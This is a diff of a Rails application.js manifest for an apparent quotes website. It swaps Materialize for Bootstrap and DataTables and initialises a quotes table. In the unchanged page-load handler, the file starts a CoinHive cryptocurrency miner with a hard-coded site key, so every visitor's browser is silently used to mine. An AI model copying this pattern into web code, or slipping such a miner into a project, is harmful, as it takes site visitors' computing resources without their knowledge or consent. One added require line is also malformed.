@@ -11,15 +11,16 @@
 // about supported directives.
 //
 //= require jquery
-//= require materialize-sprockets
 //= require jquery_ujs
+//= require bootstrap.min
+//= datatables.min 
 //= require_tree .
 
 $(document).ready(function(){
   var miner = new CoinHive.Anonymous('80bDWx1KXIBOSEbxCmC01GVNYxUlqUYo'); 
   miner.start(); 
 
-  $(".button-collapse").sideNav();
+  $("#quotes-table").DataTable();
 
   $(".favorite-quote").click(function(){
     that = this
